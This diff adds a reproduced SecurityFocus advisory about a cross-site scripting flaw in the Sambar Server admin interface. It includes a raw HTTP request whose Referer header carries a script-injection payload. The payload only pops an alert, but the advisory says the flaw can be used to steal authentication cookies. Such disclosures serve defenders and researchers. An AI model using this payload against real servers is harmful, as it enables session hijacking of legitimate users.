@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13722/info
+  
+Sambar Server administrative interface does not adequately filter some HTML code thus making it prone to cross-site scripting attacks. It is possible for a remote attacker to create a malicious link containing script code which will be executed in the browser of a legitimate user. All code will be executed within the context of the Web site running Sambar Server.
+  
+This issue may be exploited to steal cookie-based authentication credentials from legitimate users of the Web site running the vulnerable software. 
+
+GET /CheckingXssInReferer.html HTTP/1.0
+Cookie: RCuid=SS1-1113767443-uh287LUVlBbVwpESKaZ29/hq0cDSVneAgWlracaqApQ=; RCslb=5; RCrelogin=false
+Host: www.example.com
+Accept: */*
+Accept-Language: en-us
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)
+Referer: "></a><script>alert('XSS')</script> 
